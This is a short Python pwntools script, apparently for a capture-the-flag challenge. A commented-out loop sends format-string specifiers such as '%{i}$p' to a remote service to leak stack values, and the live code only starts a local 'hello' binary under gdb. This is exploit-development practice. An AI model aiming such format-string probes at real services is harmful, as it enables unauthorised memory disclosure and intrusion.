#!/usr/bin/env python

from pwn import *

# for i in range(50,100):
#     try:
#         r = remote('140.113.24.241', 30172)
#         r.sendline('%{}$p'.format(i).encode())
#         result = r.recvline().decode()
#         print(f"Result for %{i}$s: {result}")
#     except EOFError:
#         print(f"Connection closed by the server when using %{i}$s")
#     except Exception as e:
#         print(f"An error occurred with %{i}$s: {e}")
#     finally:
#         r.close()

# r = remote('140.113.24.241', 30172)
r = gdb.debug('./server-ctf-src/hello/hello', '''
    break main
    continue
''')

r.interactive()
# print(r.recv())


r.close()
